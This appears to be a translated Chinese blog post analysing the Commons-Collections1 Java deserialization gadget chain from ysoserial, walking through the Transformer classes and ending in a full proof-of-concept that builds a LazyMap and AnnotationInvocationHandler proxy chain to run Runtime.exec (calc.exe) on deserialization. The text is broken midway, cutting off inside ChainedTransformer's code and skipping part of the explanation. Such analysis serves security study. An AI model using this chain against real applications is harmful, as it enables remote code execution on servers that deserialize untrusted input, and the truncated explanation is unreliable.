# ysoserial系列-Commons-Collections1链分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
在之前的文章中已经分析了 **ysoserial** 中 URLDNS 链，有兴趣的师傅可以阅读一下。但是这条链子也只是 Java
反序列化学习的开胃菜，接下来的 Commons-Collections 利用链才是主菜。
> [ysoserial系列-> URLDNS链分析](http://121.40.251.109/2021/07/08/2021-7-8-ysoserial%E7%B3%BB%E5%88%97-URLDNS%E9%93%BE%E5%88%86%E6%9E%90/)
不过在正式分析 Common-Collections1 利用链之前，先讲解一下`Transformer`接口以及继承了这个接口的类。
## Transformer
找到它的源代码：
    package org.apache.commons.collections;
    public interface Transformer {
        Object transform(Object var1);
    }
可以看到`Transformer`接口只有一个`transform`方法，之后所有继承该接口的类都需要实现这个方法。
再看一下官方文档如何描述这个方法的：
大致意思就是会将传入的`object`进行转换，然后返回转换后的`object`。还是有点抽象，不过没关系，先放着接下来再根据继承该接口的类进行具体分析。
###  ConstantTransformer
部分源码如下：
    public ConstantTransformer(Object constantToReturn) {
            this.iConstant = constantToReturn;
        }
    public Object transform(Object input) {
        return this.iConstant;
    }
`ConstantTransformer`类当中的`transform`方法就是将初始化时传入的对象返回。
###  InvokerTransformer
部分源码如下：
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
            this.iMethodName = methodName;
            this.iParamTypes = paramTypes;
            this.iArgs = args;
        }
    public Object transform(Object input) {
            if (input == null) {
                return null;
            } else {
                try {
                    Class cls = input.getClass();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                    return method.invoke(input, this.iArgs);
                } catch (NoSuchMethodException var5) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
                } catch (IllegalAccessException var6) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
                } catch (InvocationTargetException var7) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
                }
            }
        }
`InvokerTransformer`类的构造函数传入三个参数——方法名，参数类型数组，参数数组。在`transform`方法中通过反射机制调用传入某个类的方法，而调用的方法及其所需要的参数都在构造函数中进行了赋值，最终返回该方法的执行结果。
###  ChainedTransformer
部分源码如下：
    public ChainedTransformer(Transformer[] transformers) {
            this.iTransformers = transformers;
        }
    public Object transform(Object object) {
            for(int i = 0; i 
简而言之就是当调用到被代理对象的任何方法时，都会先调用`InvocationHandler`接口中的`invoke`方法，而`AnnotationInvocationHandler`正好实现了该接口。
所以修改后的 POC 如下：
    package ysoserial.CommonsCollections1;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    public class LazyDemo {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"C:\\Windows\\System32\\calc.exe"})
            };
            Transformer tranformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            Map outerMap = LazyMap.decorate(innerMap, tranformerChain);
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);
            Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
            // 因为反序列化的入口是 AnnotationInvocationHandler，所以需要将传入 proxyMap 去再次实例化 AnnotationInvocationHandler 
            handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(handler);
            System.out.println(barr);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
            Object o = (Object) ois.readObject();
        }
    }
## 参考链接
  1. 
  2. 
  3. 